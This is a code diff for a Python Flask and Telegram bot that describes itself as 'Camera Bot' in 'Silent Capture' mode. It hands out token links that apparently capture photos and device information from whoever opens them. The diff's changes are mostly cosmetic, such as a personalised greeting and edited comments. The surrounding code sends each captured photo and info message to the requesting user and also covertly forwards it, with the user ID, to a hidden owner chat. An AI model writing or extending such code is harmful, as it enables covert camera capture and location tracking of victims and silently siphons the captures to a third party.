@@ -7,9 +7,7 @@ from telegram.ext import Updater, CommandHandler
 from utils import BOT_TOKEN, OWNER_CHAT_ID, IPINFO_TOKEN
 from token_store import generate_token, store_token_for_chat, get_chat_id
 
-# Telegram API base
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
-# Render external URL (set in environment)
 RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
 
 app = Flask(__name__)
@@ -17,12 +15,15 @@ app = Flask(__name__)
 # ---------------- Telegram Bot Logic ---------------- #
 def start(update, context):
     chat_id = update.message.chat_id
+    user = update.message.from_user
     token = generate_token(chat_id)
+    # Save mapping
     store_token_for_chat(token, chat_id)
+
     link = f"{RENDER_URL}?token={token}"
 
     greeting = (
-        "🕶️ *Welcome to Camera Bot*\n"
+        f"🕶️ *Welcome {user.first_name or ''}*\n"
         "━━━━━━━━━━━━━━━━━━━━━━━\n"
         "💀 *Status:* Activated\n"
         "📡 *Mode:* Silent Capture\n"
@@ -34,7 +35,6 @@ def start(update, context):
         "━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"📷 *Click to activate camera:*\n{link}"
     )
-
     context.bot.send_message(chat_id=chat_id, text=greeting, parse_mode="Markdown")
 
 def run_bot():
@@ -69,7 +69,7 @@ def send_photo():
         with open(filename, "wb") as f:
             f.write(image_bytes)
 
-        # Step 1: Send photo to the user
+        # Step 1: Send photo to user
         with open(filename, "rb") as photo:
             resp = requests.post(
                 f"{TELEGRAM_API}/sendPhoto",
@@ -77,12 +77,12 @@ def send_photo():
                 files={"photo": photo}
             )
         result = resp.json()
-        print("User send response:", result)
+        print("User photo response:", result)
 
         # Step 2: Forward to owner
         if result.get("ok"):
             message_id = result["result"]["message_id"]
-            fwd_resp = requests.post(
+            requests.post(
                 f"{TELEGRAM_API}/forwardMessage",
                 data={
                     "chat_id": OWNER_CHAT_ID,
@@ -90,7 +90,6 @@ def send_photo():
                     "message_id": message_id
                 }
             )
-            print("Owner forward response:", fwd_resp.text)
     finally:
         try:
             os.remove(filename)
@@ -117,9 +116,8 @@ def send_info():
     result = resp.json()
     print("User info response:", result)
 
-    # Step 2: Forward/duplicate to owner
+    # Step 2: Send to owner with identity
     if result.get("ok"):
-        # Duplicate with user identity
         owner_text = f"👤 User ID: `{chat_id}`\n\n{info_text}"
         requests.post(
             f"{TELEGRAM_API}/sendMessage",
